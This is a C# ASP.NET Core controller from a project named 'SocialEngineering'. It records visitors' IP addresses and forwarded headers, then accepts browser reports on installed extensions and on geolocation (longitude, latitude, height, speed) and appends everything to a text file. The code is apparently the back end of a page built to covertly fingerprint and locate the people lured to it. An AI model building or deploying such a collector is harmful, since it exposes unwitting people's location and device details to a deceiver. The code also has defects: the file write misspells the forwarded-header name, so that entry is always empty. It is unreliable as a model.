using Microsoft.AspNetCore.Mvc;
using Microsoft.Extensions.Logging;
using SocialEngineering.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SocialEngineering.Controllers
{
    public class HomeController : Controller
    {
        public HomeController() { }

        public IActionResult Index()
        {
            Console.WriteLine("\nIp: " + Request.HttpContext.Connection.RemoteIpAddress + ":" + Request.HttpContext.Connection.RemotePort);
            Console.WriteLine("Remote Ip From Header: " + Request.Headers["X-Forwarded-For"]);

            Monitor.Enter(Synchronization.LockObject);

            using (FileStream fs = new FileStream("Info.txt", FileMode.Append, FileAccess.Write))
            {
                fs.Write(Encoding.UTF8.GetBytes($"\n{DateTime.Now.ToString()}\n"));
                fs.Write(Encoding.UTF8.GetBytes("Remote Ip From Header: " + Request.Headers["X - Forwarded - For"] + "\n"));
            }

            Monitor.Exit(Synchronization.LockObject);
            return View();
        }

        [HttpPost]
        public IActionResult TellExtension([FromBody] ExtensionInfo info)
        {
            if (info.IsPresent)
                Console.WriteLine($"Looks like {info.Name} is installed...{info.Reason}");
            else
                Console.WriteLine($"Looks like {info.Name} is not installed...{info.Reason}");

            Monitor.Enter(Synchronization.LockObject);

            using(FileStream fs = new FileStream("Info.txt",FileMode.Append,FileAccess.Write))
            {
                fs.Write(Encoding.UTF8.GetBytes($"\n{DateTime.Now.ToString()}\n"));
                fs.Write(Encoding.UTF8.GetBytes($"{info.Name} : {info.IsPresent}\n"));
                fs.Write(Encoding.UTF8.GetBytes($"{info.Reason}\n"));
            }

            Monitor.Exit(Synchronization.LockObject);

            return Ok();
        }

        [HttpPost]
        public IActionResult TellGeo([FromBody] Geolocation geo)
        {
            if (geo == null)
                return Ok();

            Console.WriteLine($"Longitude: {geo.Longitude}");
            Console.WriteLine($"Latitude: {geo.Latitude}");
            Console.WriteLine($"Height: {geo.Height}");
            Console.WriteLine($"Speed: {geo.Speed}");

            Monitor.Enter(Synchronization.LockObject);

            using (FileStream fs = new FileStream("Info.txt", FileMode.Append, FileAccess.Write))
            {
                fs.Write(Encoding.UTF8.GetBytes($"\n{DateTime.Now.ToString()}\n"));
                fs.Write(Encoding.UTF8.GetBytes($"Longitude: {geo.Longitude}\n"));
                fs.Write(Encoding.UTF8.GetBytes($"Latitude: {geo.Latitude}\n"));
                fs.Write(Encoding.UTF8.GetBytes($"Height: {geo.Height}\n"));
                fs.Write(Encoding.UTF8.GetBytes($"Speed: {geo.Speed}\n"));
            }

            Monitor.Exit(Synchronization.LockObject);

            return Ok();
        }
    }
}
